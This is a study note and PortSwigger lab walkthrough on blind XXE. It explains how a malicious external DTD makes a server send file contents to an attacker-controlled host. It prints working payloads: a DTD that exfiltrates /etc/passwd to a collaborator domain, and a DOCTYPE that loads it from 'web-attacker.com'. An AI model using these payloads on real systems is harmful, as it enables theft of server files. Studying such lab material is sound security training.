- What an attacker really wants to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, But the attacker need to control over a malicious DTD on their own system. They use this malicious DTD with a vulnerability (blind XXE) to ask a server to do something. The server unknowingly fetches and uses the malicious DTD, letting the attacker steal sensitive data.

**An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:**
```python
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://collaborator_domain/?x=%file;'>"> 
%eval; 
%exfiltrate;
```
**This DTD carries out the following steps:**
1. **Defining an XML Parameter Entity "file":**
    
    - The code creates an XML parameter entity called "file."
    - This entity is like a container that can hold data.
    - It's set to grab the content of the sensitive file "/etc/passwd" on the system.
2. **Defining an XML Parameter Entity "eval" with "exfiltrate":**
    
    - Another XML parameter entity called "eval" is created.
    - Inside "eval," a dynamic declaration of a new XML parameter entity called "exfiltrate" is set up.
    - The purpose of "exfiltrate" is to send data to the attacker's web server.
    - The content of the "file" entity is embedded in the URL query string of an HTTP request to the attacker's server.
3. **Using the "eval" and "exfiltrate" Entities:**
    
    - The "%eval;" part triggers the dynamic declaration of the "exfiltrate" entity.
    - The "%exfiltrate;" part then uses this newly defined "exfiltrate" entity.
    - This results in an HTTP request being made to the attacker's web server, and the content of the "file" entity is included in the URL query.

**The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:**
```python
http://web-attacker.com/malicious.dtd
```

**Finally, the attacker must submit the following XXE payload to the vulnerable application:**
```python
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```
- This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD.
- This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline.
- The steps defined within the malicious DTD are then executed, and the `/etc/passwd` file is transmitted to the attacker's server.

**Note** - 
1. **Limitations with File Contents and Newlines:**
    
    - This technique might not always work due to the way some data is structured in files.
    - For example, special characters like newline characters in the "/etc/passwd" file can cause problems.
    - Some XML processors validate which characters are allowed in URLs, and newlines might not be allowed.
2. **Using FTP Instead of HTTP:**
    - In cases where certain characters are restricted in URLs, the technique can fail.
    - To overcome this, attackers might switch from using HTTP to FTP (a different protocol) for sending data.
3. **Alternative Targets for Data Exfiltration:**
    - Sometimes, exfiltrating data with newline characters isn't possible.
    - In such cases, attackers might focus on different files like "/etc/hostname" to steal data

## Steps to solve lab
### Desc - Exploiting blind XXE to exfiltrate data using a malicious external DTD
**Our end goal** - To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

1. First save your `.dtd` file in your server and grab the file URL. For lab, navigate to exploit server(as it is provided by portswigger) and add below contents as described below:
![[XXE14.png]]

2. Now, We previously discussed that if this file contains any characters like newline character then this technique might not work to the way some data is structured in files. In such cases, attackers might focus on different files like "/etc/hostname" to steal data.
![[XXE15.png]]

3. Now, send the `POST /product/stock` request to the Burp "Repeater". 
![[XXE16.png]]

4. Now, add the exploit server file url as the value to the exter entity as described below:
![[XXE17.png]]

5. Now, after sending this request click on "Poll Now" in the "Collaborator" tab and grab the hostname of the target machine.
![[XXE18.png]]
Submit this as a solution.